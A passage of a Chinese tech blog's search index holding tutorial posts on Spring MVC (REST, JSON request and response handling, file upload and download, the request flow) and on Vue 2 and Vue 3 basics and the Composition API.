&lt;version&gt;5.3.1&lt;/version&gt;&lt;/dependency&gt;\n\n","categories":["SSM"],"tags":["Spring"]},{"title":"SpringMVC","url":"/2023/02/21/SSM%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9ASpring%20MVC/","content":"SpringMVC什么是MVCMVC是一种软件架构的思想，将软件按照模型、视图、控制器来划分\nM：Model，模型层，指工程中的JavaBean，作用是处理数据\nJavaBean分为两类：\n\n一类称为实体类Bean：专门存储业务数据的，如 Student、User 等\n一类称为业务处理 Bean：指 Service 或 Dao 对象，专门用于处理业务逻辑和数据访问。\n\nV：View，视图层，指工程中的html或jsp等页面，作用是与用户进行交互，展示数据\nC：Controller，控制层，指工程中的servlet，作用是接收请求和响应浏览器\nMVC的工作流程： 用户通过视图层发送请求到服务器，在服务器中请求被Controller接收，Controller\n调用相应的Model层处理请求，处理完毕将结果返回到Controller，Controller再根据请求处理的结果\n找到相应的View视图，渲染数据后最终响应给浏览器\nRESTfulREST：Representational State Transfer，表现层资源状态转移。\nRESTful的实现具体说，就是 HTTP 协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。\n它们分别对应四种基本操作：GET 用来获取资源，POST 用来新建资源，PUT 用来更新资源，DELETE用来删除资源。\nREST 风格提倡 URL 地址使用统一的风格设计，从前到后各个单词使用斜杠分开，不使用问号键值对方式携带请求参数，而是将要发送给服务器的数据作为 URL 地址的一部分，以保证整体风格的一致性。\n\n\n\n操作\n传统方式\nREST风格\n\n\n\n查询操作\ngetUserById?id&#x3D;1\nuser&#x2F;1–&gt;get请求方式\n\n\n保存操作\nsaveUser\nuser–&gt;post请求方式\n\n\n删除操作\ndeleteUser?id&#x3D;1\nuser&#x2F;1–&gt;delete请求方式\n\n\n更新操作\nupdateUser\nuser–&gt;put请求方式\n\n\nSpringMVC处理ajax请求@RequestBody@RequestBody可以获取请求体信息，使用@RequestBody注解标识控制器方法的形参，当前请求的请求体就会为当前注解所标识的形参赋值\n&lt;!--此时必须使用post请求方式，因为get请求没有请求体--&gt;&lt;form th:action=&quot;@&#123;/test/RequestBody&#125;&quot; method=&quot;post&quot;&gt;    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;    密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;@RequestMapping(&quot;/test/RequestBody&quot;)public String testRequestBody(@RequestBody String requestBody)&#123;    System.out.println(&quot;requestBody:&quot;+requestBody);    return &quot;success&quot;;&#125;\n\n输出结果：\nrequestBody:username&#x3D;admin&amp;password&#x3D;123456\n@RequestBody获取json格式的请求参数\n在使用了axios发送ajax请求之后，浏览器发送到服务器的请求参数有两种格式：\n1、name&#x3D;value&amp;name&#x3D;value…，此时的请求参数可以通过request.getParameter()获取，对应SpringMVC中，可以直接通过控制器方法的形参获取此类请求参数\n2、{key:value,key:value,…}，此时无法通过request.getParameter()获取，之前我们使用操作json的相关jar包gson或jackson处理此类请求参数，可以将其转换为指定的实体类对象或map集合。在SpringMVC中，直接使用@RequestBody注解标识控制器方法的形参即可将此类请求参数\n转换为java对象\n\n使用@RequestBody获取json格式的请求参数的条件：\n1、导入jackson的依赖\n&lt;dependency&gt;    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;    &lt;version&gt;2.12.1&lt;/version&gt;&lt;/dependency&gt;\n\n2、SpringMVC的配置文件中设置开启mvc的注解驱动\n&lt;!--开启mvc的注解驱动--&gt;&lt;mvc:annotation-driven /&gt;\n\n3、在控制器方法的形参位置，设置json格式的请求参数要转换成的java类型（实体类或map）的参数，并使用@RequestBody注解标识\n&lt;input type=&quot;button&quot; value=&quot;测试@RequestBody获取json格式的请求参数&quot;@click=&quot;testRequestBody()&quot;&gt;&lt;br&gt;&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;/js/vue.js&#125;&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;/js/axios.min.js&#125;&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var vue = new Vue(&#123;        el:&quot;#app&quot;,        methods:&#123;            testRequestBody()&#123;                axios.post(                    &quot;/SpringMVC/test/RequestBody/json&quot;,                    &#123;username:&quot;admin&quot;,password:&quot;123456&quot;&#125;                ).then(response=&gt;&#123;                    console.log(response.data);                &#125;);            &#125;        &#125;    &#125;);&lt;/script&gt;//将json格式的数据转换为map集合@RequestMapping(&quot;/test/RequestBody/json&quot;)public void testRequestBody(@RequestBody Map&lt;String, Object&gt; map,HttpServletResponse response) throws IOException &#123;    System.out.println(map);    //&#123;username=admin, password=123456&#125;    response.getWriter().print(&quot;hello,axios&quot;);&#125;//将json格式的数据转换为实体类对象@RequestMapping(&quot;/test/RequestBody/json&quot;)public void testRequestBody(@RequestBody User user, HttpServletResponseresponse) throws IOException &#123;    System.out.println(user);    //User&#123;id=null, username=&#x27;admin&#x27;, password=&#x27;123456&#x27;, age=null,gender=&#x27;null&#x27;&#125;\tresponse.getWriter().print(&quot;hello,axios&quot;);&#125;\n\n@ResponseBody@ResponseBody用于标识一个控制器方法，可以将该方法的返回值直接作为响应报文的响应体响应到浏览器\n@RequestMapping(&quot;/testResponseBody&quot;)public String testResponseBody()&#123;    //此时会跳转到逻辑视图success所对应的页面    return &quot;success&quot;;&#125;@RequestMapping(&quot;/testResponseBody&quot;)@ResponseBodypublic String testResponseBody()&#123;    //此时响应浏览器数据success    return &quot;success&quot;;&#125;\n\n@ResponseBody响应浏览器json数据服务器处理ajax请求之后，大多数情况都需要向浏览器响应一个java对象，此时必须将java对象转换为json字符串才可以响应到浏览器，之前我们使用操作json数据的jar包gson或jackson将java对象转换为json字符串。在SpringMVC中，我们可以直接使用@ResponseBody注解实现此功能\n@ResponseBody响应浏览器json数据的条件：\n1、导入jackson的依赖\n&lt;dependency&gt;    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;    &lt;version&gt;2.12.1&lt;/version&gt;&lt;/dependency&gt;\n\n2、SpringMVC的配置文件中设置开启mvc的注解驱动\n&lt;!--开启mvc的注解驱动--&gt;&lt;mvc:annotation-driven /&gt;\n\n3、使用@ResponseBody注解标识控制器方法，在方法中，将需要转换为json字符串并响应到浏览器\n的java对象作为控制器方法的返回值，此时SpringMVC就可以将此对象直接转换为json字符串并响应到浏览器\n&lt;input type=&quot;button&quot; value=&quot;测试@ResponseBody响应浏览器json格式的数据&quot;@click=&quot;testResponseBody()&quot;&gt;&lt;br&gt;&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;/js/vue.js&#125;&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;/js/axios.min.js&#125;&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var vue = new Vue(&#123;        el:&quot;#app&quot;,        methods:&#123;            testResponseBody()&#123;                axios.post(&quot;/SpringMVC/test/ResponseBody/json&quot;).then(response=&gt;&#123;                    console.log(response.data);                &#125;);            &#125;        &#125;    &#125;);&lt;/script&gt;//响应浏览器list集合@RequestMapping(&quot;/test/ResponseBody/json&quot;)@ResponseBodypublic List&lt;User&gt; testResponseBody()&#123;    User user1 = new User(1001,&quot;admin1&quot;,&quot;123456&quot;,23,&quot;男&quot;);    User user2 = new User(1002,&quot;admin2&quot;,&quot;123456&quot;,23,&quot;男&quot;);    User user3 = new User(1003,&quot;admin3&quot;,&quot;123456&quot;,23,&quot;男&quot;);    List&lt;User&gt; list = Arrays.asList(user1, user2, user3);    return list;&#125;//响应浏览器map集合@RequestMapping(&quot;/test/ResponseBody/json&quot;)@ResponseBodypublic Map&lt;String, Object&gt; testResponseBody()&#123;    User user1 = new User(1001,&quot;admin1&quot;,&quot;123456&quot;,23,&quot;男&quot;);    User user2 = new User(1002,&quot;admin2&quot;,&quot;123456&quot;,23,&quot;男&quot;);    User user3 = new User(1003,&quot;admin3&quot;,&quot;123456&quot;,23,&quot;男&quot;);    Map&lt;String, Object&gt; map = new HashMap&lt;&gt;();    map.put(&quot;1001&quot;, user1);    map.put(&quot;1002&quot;, user2);    map.put(&quot;1003&quot;, user3);    return map;&#125;//响应浏览器实体类对象@RequestMapping(&quot;/test/ResponseBody/json&quot;)@ResponseBodypublic User testResponseBody()&#123;    return user;&#125;\n\n@RestController注解@RestController注解是springMVC提供的一个复合注解，标识在控制器的类上，就相当于为类添加了\n@Controller注解，并且为其中的每个方法添加了**@ResponseBody**注解\n文件上传和下载10.1、文件下载ResponseEntity用于控制器方法的返回值类型，该控制器方法的返回值就是响应到浏览器的响应报文\n使用ResponseEntity实现下载文件的功能\n@RequestMapping(&quot;/testDown&quot;)public ResponseEntity&lt;byte[]&gt; testResponseEntity(HttpSession session) throws    IOException &#123;    //获取ServletContext对象    ServletContext servletContext = session.getServletContext();    //获取服务器中文件的真实路径    String realPath = servletContext.getRealPath(&quot;/static/img/1.jpg&quot;);    //创建输入流    InputStream is = new FileInputStream(realPath);    //创建字节数组    byte[] bytes = new byte[is.available()];    //将流读到字节数组中    is.read(bytes);    //创建HttpHeaders对象设置响应头信息    MultiValueMap&lt;String, String&gt; headers = new HttpHeaders();    //设置要下载方式以及下载文件的名字    headers.add(&quot;Content-Disposition&quot;, &quot;attachment;filename=1.jpg&quot;);    //设置响应状态码    HttpStatus statusCode = HttpStatus.OK;    //创建ResponseEntity对象    ResponseEntity&lt;byte[]&gt; responseEntity = new ResponseEntity&lt;&gt;(bytes, headers,statusCode);    //关闭输入流    is.close();    return responseEntity;&#125;\n\n10.2、文件上传文件上传要求form表单的请求方式必须为post，并且添加属性enctype&#x3D;”multipart&#x2F;form-data”\nSpringMVC中将上传的文件封装到MultipartFile对象中，通过此对象可以获取文件相关信息\n上传步骤：\n①添加依赖：&lt;!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --&gt;&lt;dependency&gt;    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;    &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt;\n\n②在SpringMVC的配置文件中添加配置：&lt;!--必须通过文件解析器的解析才能将文件转换为MultipartFile对象--&gt;&lt;bean id=&quot;multipartResolver&quot;class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;&lt;/bean&gt;\n\n③控制器方法：@RequestMapping(&quot;/testUp&quot;)public String testUp(MultipartFile photo, HttpSession session) throws IOException &#123;    //获取上传的文件的文件名    String fileName = photo.getOriginalFilename();    //处理文件重名问题    String hzName = fileName.substring(fileName.lastIndexOf(&quot;.&quot;));    fileName = UUID.randomUUID().toString() + hzName;    //获取服务器中photo目录的路径    ServletContext servletContext = session.getServletContext();    String photoPath = servletContext.getRealPath(&quot;photo&quot;);    File file = new File(photoPath);    if(!file.exists())&#123;        file.mkdir();    &#125;    String finalPath = photoPath + File.separator + fileName;    //实现上传功能    photo.transferTo(new File(finalPath));    return &quot;success&quot;;&#125;\n\nSpringMVC执行流程14.1、SpringMVC常用组件\nDispatcherServlet：前端控制器，不需要工程师开发，由框架提供\n\n作用：统一处理请求和响应，整个流程控制的中心，由它调用其它组件处理用户的请求\n\nHandlerMapping：处理器映射器，不需要工程师开发，由框架提供\n\n作用：根据请求的url、method等信息查找Handler，即控制器方法\n\nHandler：处理器，需要工程师开发\n\n作用：在DispatcherServlet的控制下Handler对具体的用户请求进行处理\n\nHandlerAdapter：处理器适配器，不需要工程师开发，由框架提供\n\n作用：通过HandlerAdapter对处理器（控制器方法）进行执行\n\nViewResolver：视图解析器，不需要工程师开发，由框架提供\n\n作用：进行视图解析，得到相应的视图，例如：ThymeleafView、InternalResourceView、RedirectView\n\nView：视图\n\n作用：将模型数据通过页面展示给用户\nSpringMVC的执行流程\n用户向服务器发送请求，请求被SpringMVC 前端控制器 DispatcherServlet捕获。\n\nDispatcherServlet对请求URL进行解析，得到请求资源标识符（URI），判断请求URI对应的映射：\n\n\n​        a) 不存在\n​            i. 再判断是否配置了mvc:default-servlet-handler\n​            ii. 如果没配置，则控制台报映射查找不到，客户端展示404错误\n​            iii. 如果有配置，则访问目标资源（一般为静态资源，如：JS,CSS,HTML），找不到客户端也会展示404错误\n​        b) 存在则执行下面的流程\n\n根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象（包括Handler对象以及Handler对象对应的拦截器），最后以HandlerExecutionChain执行链对象的形式返回。\n\nDispatcherServlet 根据获得的Handler，选择一个合适的HandlerAdapter。\n\n如果成功获得HandlerAdapter，此时将开始执行拦截器的preHandler(…)方法【正向】\n\n提取Request中的模型数据，填充Handler入参，开始执行Handler（Controller)方法，处理请求。\n\n\n​        在填充Handler的入参过程中，根据你的配置，Spring将帮你做一些额外的工作：\n​        a) HttpMessageConveter： 将请求消息（如Json、xml等数据）转换成一个对象，将对象转换为指定的响应信息\n​        b) 数据转换：对请求消息进行数据转换。如String转换成Integer、Double等\n​        c) 数据格式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等\n​        d) 数据验证： 验证数据的有效性（长度、格式等），验证结果存储到BindingResult或Error中\n\nHandler执行完成后，向DispatcherServlet 返回一个ModelAndView对象。\n\n此时将开始执行拦截器的postHandle(…)方法【逆向】。\n\n根据返回的ModelAndView（此时会判断是否存在异常：如果存在异常，则执行HandlerExceptionResolver进行异常处理）选择一个适合的ViewResolver进行视图解析，根据Model和View，来渲染视图。\n\n渲染视图完毕执行拦截器的afterCompletion(…)方法【逆向】。\n\n将渲染结果返回给客户端。\n\n\n","categories":["SSM"],"tags":["SpringMVC"]},{"title":"Vue（一）：Vue简介","url":"/2022/04/01/Vue%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AVue%E7%AE%80%E4%BB%8B/","content":"什么是Vue？\nVue官网\n\nVue：动态构建用户界面的渐进式 JavaScript 框架\n\n构建用户界面：把数据通过某种办法变成用户界面\n渐进式：Vue可以自底向上逐层的应用，简单应用只需要一个轻量小巧的核心\n\n\n作者：尤雨溪\n\n\n\nVue的特点\n遵循MVVM模式\n编码简洁，体积小，运行效率高，适合移动&#x2F;PC端开发\n它本身只关注 UI，可以引入其它第三方库开发项目\n采用组件化模式，提高代码复用率、且让代码更好维护\n声明式编码，让编码人员无需直接操作DOM，提高开发效率\n使用虚拟DOM 和 Diff算法，尽量复用DOM节点\n\nVue与其它JS框架的关联\n借鉴 angular 的 模板 和 数据绑定 技术\n借鉴 react 的 组件化 和 虚拟DOM 技术\n\nVue周边库\nvue-cli：vue 脚手架\nvue-resource(axios)：ajax 请求\nvue-router：路由\nvuex：状态管理（它是 vue 的插件但是没有用 vue-xxx 的命名规则）\nvue-lazyload：图片懒加载\nvue-scroller：页面滑动相关\nmint-ui：基于 vue 的 UI 组件库（移动端）\nelement-ui：基于 vue 的 UI 组件库（PC 端）\n\n初识Vue前置工作\n给浏览器安装 Vue Devtools 插件\n标签引入Vue包\n（可选）阻止vue在启动时生成生产提示Vue.config.productionTip &#x3D; false\nfavicon 需要将页签图标放在项目根路径，重新打开就有了（shfit+F5 强制刷新）\n\n初识Vue\n想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象\n\nroot 容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法\n\nroot 容器里的代码被称为【Vue模板】\n\nVue 实例与容器是一一对应的\n\n真实开发中只有一个Vue实例，并且会配合着组件一起使用\n\n中的 xxx 要写 **js 表达式**，且 xxx 可以自动读取到data中的所有属性\n\n注意区分：js 表达式 和 js代码（语句）\n\n表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方a a+b demo(1) x &#x3D;&#x3D;&#x3D; y ? ‘a’ : ‘b’\njs代码（语句）if(){} for(){}\n\n\n一旦data中的数据发生变化，那么模板中用到该数据的地方也会自动更新\n\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;\t&lt;head&gt;\t\t&lt;meta charset=&quot;UTF-8&quot; /&gt;\t\t&lt;title&gt;初识Vue&lt;/title&gt;\t\t&lt;!-- 引入Vue --&gt;\t\t&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;\t&lt;/head&gt;\t&lt;body&gt;\t\t&lt;!-- 准备好一个容器 --&gt;\t\t&lt;div id=&quot;demo&quot;&gt;\t\t\t&lt;h1&gt;Hello，&#123;&#123;name.toUpperCase()&#125;&#125;，&#123;&#123;address&#125;&#125;&lt;/h1&gt;\t\t&lt;/div&gt;\t\t&lt;script type=&quot;text/javascript&quot; &gt;\t\t\tVue.config.productionTip = false //阻止 vue 在启动时生成生产提示。\t\t\t//创建Vue实例\t\t\tnew Vue(&#123;\t\t\t\tel:&#x27;#demo&#x27;, //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。\t\t\t\tdata:&#123; //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。\t\t\t\t\tname:&#x27;atguigu&#x27;,\t\t\t\t\taddress:&#x27;北京&#x27;\t\t\t\t&#125;\t\t\t&#125;)\t\t&lt;/script&gt;\t&lt;/body&gt;&lt;/html&gt;\n\n","categories":["Vue"],"tags":["Vue"]},{"title":"Vue（七）：绑定样式和条件渲染","url":"/2022/04/01/Vue%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E7%BB%91%E5%AE%9A%E6%A0%B7%E5%BC%8F%E5%92%8C%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/","content":"绑定样式\nclass样式\n\n写法：:class=&quot;xxx&quot;，xxx 可以是字符串、数组、对象\n字符串写法适用于：类名不确定，要动态获取\n数组写法适用于：要绑定多个样式，个数不确定，名字也不确定\n对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用\n\n\n\n\nstyle样式\n\n写法：：style=&quot;xxx&quot;,xxx 可以是对象、数组\n\n对象写法:style=&quot;&#123;fontSize: xxx&#125;&quot;其中 xxx 是动态值\n\n数组写法:style=&quot;[a,b]&quot;其中a、b是样式对象\n\n\n\n\n&lt;style&gt;  .basic &#123;width: 300px;height: 50px;border: 1px solid black;&#125;  .happy &#123;border: 3px solid red;background-color: rgba(255, 255, 0, 0.644);    background: linear-gradient(30deg, yellow, pink, orange, yellow);&#125;  .sad &#123;border: 4px dashed rgb(2, 197, 2);background-color: skyblue;&#125;  .normal &#123;background-color: #bfa;&#125;  .atguigu1 &#123;background-color: yellowgreen;&#125;  .atguigu2 &#123;font-size: 20px;text-shadow: 2px 2px 10px red;&#125;  .atguigu3 &#123;border-radius: 20px;&#125;&lt;/style&gt;&lt;div id=&quot;root&quot;&gt;  &lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;  &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br/&gt;&lt;br/&gt;  &lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;  &lt;div class=&quot;basic&quot; :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br/&gt;&lt;br/&gt;  &lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;  &lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br/&gt;&lt;br/&gt;  &lt;!-- 绑定style样式--对象写法 --&gt;  &lt;div class=&quot;basic&quot; :style=&quot;styleObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br/&gt;&lt;br/&gt;  &lt;!-- 绑定style样式--数组写法 --&gt;  &lt;div class=&quot;basic&quot; :style=&quot;styleArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      name: &#x27;尚硅谷&#x27;,      mood: &#x27;normal&#x27;,      classArr: [&#x27;atguigu1&#x27;, &#x27;atguigu2&#x27;, &#x27;atguigu3&#x27;],      classObj: &#123;        atguigu1: false,        atguigu2: false,      &#125;,      styleObj: &#123;        fontSize: &#x27;40px&#x27;,        color: &#x27;red&#x27;,      &#125;,      styleObj2: &#123;        backgroundColor: &#x27;orange&#x27;      &#125;,      styleArr: [        &#123;          fontSize: &#x27;40px&#x27;,          color: &#x27;blue&#x27;,        &#125;,        &#123;          backgroundColor: &#x27;gray&#x27;        &#125;      ]    &#125;,    methods: &#123;      changeMood() &#123;        const arr = [&#x27;happy&#x27;, &#x27;sad&#x27;, &#x27;normal&#x27;]        const index = Math.floor(Math.random() * 3)        this.mood = arr[index]      &#125;    &#125;,  &#125;)&lt;/script&gt;\n\n条件渲染v-show\n写法：v-show=&quot;表达式&quot; （true or false）\n适用于：切换频率较高的场景\n特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉display: none\n\nv-if\n写法 跟 if else 语法类似\nv-if=&quot;表达式&quot;\nv-else-if=&quot;表达式&quot;\nv-else\n\n\n适用于：切换频率较低的场景，因为不展示的DOM元素直接被移除\n注意：v-if可以和v-else-if v-else一起使用，但要求结构不能被打断（中间不能插入别的结构）\n\n备注：\n使用v-if的时，元素可能无法获取到（因为不展示的DOM元素直接被移除），而使用v-show一定可以获取到\n\ntemplate标签不影响结构，页面html中不会有此标签，但只能配合v-if，不能配合v-show\n\n\n","categories":["Vue"],"tags":["绑定样式","条件渲染"]},{"title":"Vue（三十一）：render函数","url":"/2022/05/19/Vue%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%89%EF%BC%9Arender%E5%87%BD%E6%95%B0/","content":"\n简单的说，在vue中我们使用模板(template)HTML语法组建页面，使用render函数我们可以用js语言来构建DOM。 因为vue是虚拟DOM，所以在拿到template模板时也要转译成VNode的函数，而用render函数构建DOM，vue就免去了转译的过程。\n当使用render函数描述虚拟DOM时，vue提供一个函数，这个函数是就构建虚拟DOM所需要的工具。官网上给它起了个名字叫createElement。还有约定的简写叫h。\n\n基础如何使用：render: function (createElement) &#123;\t// createElement函数返回结果是VNode\treturn createElement(\t\ttag, // 标签名称\t\tdata, // 传递数据\t\tchildren // 子节点数组\t)&#125;\n\n详解render函数涉及到vue里的一个核心思想：虚拟DOM。\nVue 通过建立一个虚拟 DOM 来追踪自己要如何改变真实 DOM。请仔细看这行代码：\nreturn createElement(&#x27;h1&#x27;, this.blogTitle)\n\ncreateElement 到底会返回什么呢？其实不是一个实际的 DOM 元素。它更准确的名字可能是 createNodeDescription，因为它所包含的信息会告诉 Vue 页面上需要渲染什么样的节点，包括及其子节点的描述信息。我们把这样的节点描述为“虚拟节点 (virtual node)”，也常简写它为“VNode”。“虚拟 DOM”是我们对由 Vue 组件树建立起来的整个 VNode 树的称呼。\nVue中 渲染函数（render）的介绍和应用 - 掘金 (juejin.cn)\n","categories":["Vue"],"tags":["Vue","render"]},{"title":"Vue（三十）：Vue3快速上手","url":"/2022/04/13/Vue%EF%BC%88%E4%B8%89%E5%8D%81%EF%BC%89%EF%BC%9AVue3%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/","content":"Vue3快速上手\n\n\n\n1.Vue3简介\n2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）\n耗时2年多、2600+次提交、30+个RFC、600+次PR、99位贡献者 \ngithub上的tags地址：https://github.com/vuejs/vue-next/releases/tag/v3.0.0\n\n2.Vue3带来了什么1.性能的提升\n打包大小减少41%\n\n初次渲染快55%, 更新渲染快133%\n\n内存减少54%\n……\n\n\n2.源码的升级\n使用Proxy代替defineProperty实现响应式\n\n重写虚拟DOM的实现和Tree-Shaking\n……\n\n\n3.拥抱TypeScript\nVue3可以更好的支持TypeScript\n\n4.新的特性\nComposition API（组合API）\n\nsetup配置\nref与reactive\nwatch与watchEffect\nprovide与inject\n……\n\n\n新的内置组件\n\nFragment \nTeleport\nSuspense\n\n\n其他改变\n\n新的生命周期钩子\ndata 选项应始终被声明为一个函数\n移除keyCode支持作为 v-on 的修饰符\n……\n\n\n\n一、创建Vue3.0工程1.使用 vue-cli 创建官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create\n## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上vue --version## 安装或者升级你的@vue/clinpm install -g @vue/cli## 创建vue create vue_test## 启动cd vue_testnpm run serve\n\n2.使用 vite 创建官方文档：https://v3.cn.vuejs.org/guide/installation.html#vite\nvite官网：https://vitejs.cn\n\n什么是vite？—— 新一代前端构建工具。\n优势如下：\n开发环境中，无需打包操作，可快速的冷启动。\n轻量快速的热重载（HMR）。\n真正的按需编译，不再等待整个应用编译完成。\n\n\n传统构建 与 vite构建对比图\n\n\n## 创建工程npm init vite-app &lt;project-name&gt;## 进入工程目录cd &lt;project-name&gt;## 安装依赖npm install## 运行npm run dev\n\n二、常用 Composition API官方文档: https://v3.cn.vuejs.org/guide/composition-api-introduction.html\n1.拉开序幕的setup\n理解：Vue3.0中一个新的配置项，值为一个函数。\nsetup是所有Composition API（组合API）“ 表演的舞台 ”。\n组件中所用到的：数据、方法等等，均要配置在setup中。\nsetup函数的两种返回值：\n若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）\n若返回一个渲染函数：则可以自定义渲染内容。（了解）\n\n\n注意点：\n尽量不要与Vue2.x配置混用\nVue2.x配置（data、methos、computed…）中可以访问到setup中的属性、方法。\n但在setup中不能访问到Vue2.x配置（data、methos、computed…）。\n如果有重名, setup优先。\n\n\nsetup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）\n\n\n\n2.ref函数\n作用: 定义一个响应式的数据\n语法: const xxx = ref(initValue) \n创建一个包含响应式数据的引用对象（reference对象，简称ref对象）。\nJS中操作数据： xxx.value\n模板中读取数据: 不需要.value，直接：&lt;div&gt;&#123;&#123;xxx&#125;&#125;&lt;/div&gt;\n\n\n备注：\n接收的数据可以是：基本类型、也可以是对象类型。\n基本类型的数据：响应式依然是靠Object.defineProperty()的get与set完成的。\n对象类型的数据：内部 “ 求助 ” 了Vue3.0中的一个新函数—— reactive函数。\n\n\n\n3.reactive函数\n作用: 定义一个对象类型的响应式数据（基本类型不要用它，要用ref函数）\n语法：const 代理对象= reactive(源对象)接收一个对象（或数组），返回一个代理对象（Proxy的实例对象，简称proxy对象）\nreactive定义的响应式数据是“深层次的”。\n内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。\n\n4.Vue3.0中的响应式原理vue2.x的响应式\n实现原理：\n\n对象类型：通过Object.defineProperty()对属性的读取、修改进行拦截（数据劫持）。\n\n数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。\nObject.defineProperty(data, &#x27;count&#x27;, &#123;    get () &#123;&#125;,     set () &#123;&#125;&#125;)\n\n\n存在问题：\n\n新增属性、删除属性, 界面不会更新。\n直接通过下标修改数组, 界面不会自动更新。\n\n\n\nVue3.0的响应式\n实现原理: \n\n通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。\n\n通过Reflect（反射）:  对源对象的属性进行操作。\n\nMDN文档中描述的Proxy与Reflect：\n\nProxy：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy\n\nReflect：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect\nnew Proxy(data, &#123;\t// 拦截读取属性值    get (target, prop) &#123;    \treturn Reflect.get(target, prop)    &#125;,    // 拦截设置属性值或添加新属性    set (target, prop, value) &#123;    \treturn Reflect.set(target, prop, value)    &#125;,    // 拦截删除属性    deleteProperty (target, prop) &#123;    \treturn Reflect.deleteProperty(target, prop)    &#125;&#125;)proxy.name = &#x27;tom&#x27;   \n\n\n\n\n\n5.reactive对比ref\n从定义数据角度对比：\nref用来定义：基本类型数据。\nreactive用来定义：对象（或数组）类型数据。\n备注：ref也可以用来定义对象（或数组）类型数据, 它内部会自动通过reactive转为代理对象。\n\n\n从原理角度对比：\nref通过Object.defineProperty()的get与set来实现响应式（数据劫持）。\nreactive通过使用Proxy来实现响应式（数据劫持）, 并通过Reflect操作源对象内部的数据。\n\n\n从使用角度对比：\nref定义的数据：操作数据需要.value，读取数据时模板中直接读取不需要.value。\nreactive定义的数据：操作数据与读取数据：均不需要.value。\n\n\n\n6.setup的两个注意点\nsetup执行的时机\n\n在beforeCreate之前执行一次，this是undefined。\n\n\nsetup的参数\n\nprops：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。\ncontext：上下文对象\nattrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 this.$attrs。\nslots: 收到的插槽内容, 相当于 this.$slots。\nemit: 分发自定义事件的函数, 相当于 this.$emit。\n\n\n\n\n\n7.计算属性与监视1.computed函数\n与Vue2.x中computed配置功能一致\n\n写法\nimport &#123;computed&#125; from &#x27;vue&#x27;setup()&#123;    ...\t//计算属性——简写    let fullName = computed(()=&gt;&#123;        return person.firstName + &#x27;-&#x27; + person.lastName    &#125;)    //计算属性——完整    let fullName = computed(&#123;        get()&#123;            return person.firstName + &#x27;-&#x27; + person.lastName        &#125;,        set(value)&#123;            const nameArr = value.split(&#x27;-&#x27;)            person.firstName = nameArr[0]            person.lastName = nameArr[1]        &#125;    